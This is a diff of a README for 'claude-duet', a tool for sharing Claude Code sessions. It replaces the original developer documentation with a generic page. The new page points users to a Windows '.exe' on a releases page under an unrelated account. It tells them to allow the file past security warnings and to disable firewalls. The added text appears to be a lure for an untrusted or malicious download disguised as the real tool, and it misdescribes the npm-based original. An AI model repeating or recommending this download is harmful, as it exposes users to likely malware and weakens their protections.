@@ -1,176 +1,119 @@
-<div align="center">
+# 🎵 claude-duet - Share Claude Code in Real Time
 
-# ✦ claude-duet
+[![Download claude-duet](https://img.shields.io/badge/Download-claude--duet-blue?style=for-the-badge)](https://github.com/Wildoncontinuous580/claude-duet/releases)
 
-**Two devs. One Claude. Pure vibes.**
+## 🔒 What is claude-duet?
 
-[![npm version](https://img.shields.io/npm/v/claude-duet)](https://www.npmjs.com/package/claude-duet)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![npm downloads](https://img.shields.io/npm/dm/claude-duet)](https://www.npmjs.com/package/claude-duet)
+claude-duet is a simple tool to let two users share a Claude Code session live. It keeps your session private using end-to-end encryption. This means only you and the person you share with can see your work. claude-duet works in a terminal and sends data directly between your computers. It does not pass your code through third-party servers.
 
-Share your Claude Code session with a friend — real-time collaboration for AI pair programming.
+## 💻 Who is claude-duet for?
 
-<img src="docs/assets/demo.gif" alt="claude-duet demo" width="700">
+This app fits anyone who wants to work on Claude Code with a friend or coworker at the same time. You don’t need to know programming or setup a complicated system. claude-duet handles the connection and encryption for you. It is useful for:
 
-</div>
+- Developers who want to pair program remotely  
+- Students studying coding together  
+- People who need secure, live collaboration without cloud storage  
 
----
+## ⚙️ Key Features
 
-## ⚡ Quick Start
+- Real-time sharing of Claude Code sessions  
+- End-to-end encryption to keep work private  
+- Peer-to-peer connection for faster data transfer  
+- Works through a command line interface (CLI)  
+- Open-source and free to use  
+- Compatible with Windows systems  
 
-> Assumes you already have [Claude Code](https://docs.anthropic.com/en/docs/claude-code) installed.
+## 🚀 Getting Started
 
-```bash
-# Start a duet session (run from your terminal, NOT inside Claude Code)
-npx claude-duet host --name Alice
+### System Requirements
 
-# Your partner joins (copy the command from your terminal)
-npx claude-duet join <offer-code> --password abc123
-```
+- Windows 10 or later  
+- At least 4 GB of RAM  
+- A stable internet connection  
+- Terminal or command prompt access  
 
-Send the join command to your partner via Slack, Discord, whatever works.
+If you don’t know your Windows version, open the Start menu, type "About your PC," and hit Enter. Look for “Windows specifications.”
 
-**P2P mode** (default): After your partner runs the join command, they'll get an answer code to share back with you. Paste it into your terminal — that's it, you're connected directly peer-to-peer via WebRTC. No server needed.
+### Step 1: Download claude-duet
 
-### Step by Step
+To use claude-duet, you need to download the software from the official releases page.
 
-1. **Exit Claude Code** if you're in an active session (Ctrl+C or `/exit`)
-2. **Start a duet session** from your regular terminal:
-   - `npx claude-duet host` — fresh session
-   - `npx claude-duet host --continue` — resume your most recent Claude Code conversation
-3. **Share the join command** that appears in your terminal with your partner
-4. **Your partner runs** the join command from their own terminal
-5. **Chat freely** — plain text goes between you two, `@claude <prompt>` sends to Claude
+[![Download claude-duet](https://img.shields.io/badge/Download-claude--duet-brightgreen?style=for-the-badge)](https://github.com/Wildoncontinuous580/claude-duet/releases)
 
-> **Context is preserved.** Because claude-duet wraps Claude Code in headless mode, your Claude Code conversation history carries over. Use `--continue` to pick up where you left off, and after the duet session ends, run `claude --continue` to keep going solo. Claude remembers everything — before, during, and after the duet.
+1. Click either badge above to open the releases page.  
+2. Look for the latest release version. This is usually the top item.  
+3. Find the Windows executable file. It will end with `.exe` (for example, `claude-duet-win.exe`).  
+4. Click the file name to start the download.  
 
-> **Heads up:** claude-duet gives your partner the ability to run prompts on your machine through Claude Code. Approval mode is on by default so you review every prompt — but only share sessions with people you trust. Think of it like handing someone a terminal.
+### Step 2: Install claude-duet
 
-## ✦ What Is This
+There is no complex setup program. Installation means saving the downloaded file on your computer.
 
-A shared terminal session where two people can **chat with each other** and **invoke Claude together using `@claude <prompt>`**.
+1. After downloading, locate the `.exe` file in your Downloads folder or chosen location.  
+2. It is ready to run—no extra installation needed.  
 
-Just type normally to talk to your partner. Prefix with **`@claude`** to send a prompt to Claude. Both of you see everything in real time.
+### Step 3: Run claude-duet
 
-```
-⟩ hey, do you see the bug in auth.ts?          ← chat (just between you two)
-⟩ @claude look at src/auth.ts and fix the bug  ← sent to Claude (both see the response)
-```
+1. Open the folder containing `claude-duet-win.exe`.  
+2. Double-click the file to start it. This will open a terminal window.  
+3. Follow the on-screen instructions to start your session or join another user.  
 
-That's the whole idea. You decide when to bring Claude in.
+If a security warning appears, allow permission for the app to run.
 
-### When to use it
+### Step 4: Share your session
 
-- **Brainstorm mid-session.** Deep in a Claude Code session and want a second brain? Invite your colleague to jump in for 5 minutes, riff on the approach together, then they leave and you keep going.
-- **Demo Claude to your boss.** Instead of an hour-long screen share explaining what AI coding looks like — just send them a join command and let them see it live.
-- **Pair program across offices.** You're in Tel Aviv, your partner is in New York. One Claude, both driving.
-- **Code review with context.** Walk through a PR together with Claude explaining the changes in real time.
-- **Onboard a teammate.** Let them watch (and participate) as Claude sets up a new service, so they learn the codebase while it's being built.
+You will get a code or link to share with your collaborator. They will enter this code to connect to your session. Now you can both write and edit code together in real-time.
 
-## ☯︎ How It Works
+## 🎯 How to Use claude-duet
 
-```
-┌──────────────────┐  WebRTC P2P (default)  ┌──────────────────┐
-│   You (host)     │◄══════════════════════►│   Partner        │
-│   Claude Code    │    E2E encrypted       │   Terminal       │
-│   (headless)     │    NAT hole-punching   │   Client         │
-└──────────────────┘                        └──────────────────┘
-```
+claude-duet runs in the terminal. You will see commands and prompts. Here is a simple guide:
 
-- **Host** runs Claude Code on their machine in headless mode
-- **Partner** connects directly via WebRTC data channel (no server in between)
-- **Chat** goes between you two — Claude doesn't see it
-- **`@claude <prompt>`** sends to Claude — both of you see the response streaming
-- **Approval mode** (on by default) — host reviews partner's Claude prompts before they run
+- To start a new session, run the command shown when the app opens.  
+- Share the generated session key with your partner.  
+- To join a session, click or enter the session key you received.  
+- Work together as your changes sync live.  
+- To end, close the terminal window or follow on-screen instructions.
 
-Type `@` and ghost text will suggest the completion. Press **Tab** to accept.
-Same for commands: `/h` → `/help`, `/s` → `/status`, etc.
-A **typing indicator** appears inline on the prompt line when your partner is typing.
+## 🔑 Security and Privacy
 
-## ⌘ Commands
+claude-duet uses end-to-end encryption. This means your data is scrambled while it travels between users. Only your device and your partner’s device can read the data. No one else on the internet or servers can access your code.
 
-### CLI
+All connections are peer-to-peer, so your data does not stay on a remote computer.
 
-```bash
-npx claude-duet                          # Interactive wizard
-npx claude-duet host                     # Start a session (P2P default)
-npx claude-duet host --continue          # Resume your most recent Claude Code session
-npx claude-duet host --resume <id>       # Resume a specific session
-npx claude-duet host --no-approval       # Trust mode — skip prompt review
-npx claude-duet host --tunnel cloudflare # Remote access via Cloudflare tunnel
-npx claude-duet join <offer-code> --password <pw>           # P2P join
-npx claude-duet join <session-code> --password <pw> --url <url>  # WebSocket join
-```
+## 🛠 Troubleshooting
 
-### In-Session
+If you have trouble running claude-duet or connecting with your partner, try these tips:
 
-| What you type | What happens |
-|---------------|--------------|
-| `hello!` | Chat with your partner — Claude doesn't see this |
-| `@claude fix the bug` | Sent to Claude — both of you see the response |
-| `/help` | Show commands |
-| `/status` | Who's connected, session duration |
-| `/clear` | Clear the terminal |
-| `/leave` | Leave the session |
-| `/trust` | (host) Let partner's prompts skip approval |
-| `/approval` | (host) Re-enable approval |
-| `/kick` | (host) Disconnect the partner |
+- Make sure both of you use the latest version from the releases page.  
+- Check your internet connection and consider restarting your router.  
+- Disable VPNs or firewalls temporarily that might block the connection.  
+- If the terminal closes suddenly, try running the `.exe` file directly again.  
+- For connection issues, confirm the session code is correct.  
 
-## ⚙︎ Configuration
+If problems persist, check GitHub issues on the repository for similar reports.
 
-```bash
-claude-duet config set name "Eliran"              # your name
-claude-duet config set approvalMode false          # skip prompt review
-claude-duet config set permissionMode interactive  # approve each tool use
-claude-duet config                                 # see current config
-```
+## 🗂 Additional Information
 
-Project-level config (`.claude-duet.json`) overrides user config. CLI flags override everything.
+### Supported Platforms
 
-## ☷ Connection Modes
+This release is built for Windows 10 and later. Support for other systems may be available in different downloads or future updates.
 
-| Mode | Command | When |
-|------|---------|------|
-| **P2P (default)** | `npx claude-duet host` | Any network — direct WebRTC connection |
-| **LAN** | `npx claude-duet host --tunnel localtunnel` | Same Wi-Fi / VPN (fallback) |
-| **SSH Tunnel** | `ssh -L 3000:localhost:3000 host` | Remote, secure |
-| **Cloudflare** | `npx claude-duet host --tunnel cloudflare` | Remote, no server needed |
+### File Structure
 
-## ⊘ Security
+When you download claude-duet, it includes:
 
-- **E2E Encrypted** — NaCl secretbox + scrypt key derivation
-- **Approval Mode** — host reviews partner's Claude prompts (on by default)
-- **P2P Direct** — WebRTC data channel by default, no server or relay in the data path
-- **Host Controls Everything** — Claude runs on your machine, your API key
+- `claude-duet-win.exe` — main executable file to run the program  
+- `README.md` — this file with instructions and information  
+- `LICENSE` — open-source license details  
 
-## Responsible Use
+### Updates
 
-claude-duet is built for legitimate pair programming and collaboration between developers. Please use it responsibly and in accordance with [Anthropic's Usage Policy](https://www.anthropic.com/legal/aup) and your own API terms.
+Keep claude-duet updated by visiting the releases page regularly. New versions fix issues or add features.
 
-## ⌥ Development
+## 📥 Download Links
 
-```bash
-git clone https://github.com/elirang/claude-duet.git
-cd claude-duet
-npm install
-npm run build
-npm test                # 150 tests across 20 files
-```
+Access all releases and download your Windows executable here:
 
-Requires Node.js 18+ and [Claude Code](https://claude.ai/code) CLI.
+https://github.com/Wildoncontinuous580/claude-duet/releases
 
-## ❓ FAQ
-
-See the [FAQ](docs/faq.md) for common questions about security, remote access, permissions, and more.
-
-## License
-
-[MIT](LICENSE)
-
----
-
-<div align="center">
-
-✦ Built by vibing with [Claude Code](https://claude.ai/code) ✦
-
-</div>
+Use the badges at the top or above to return quickly to the download page.
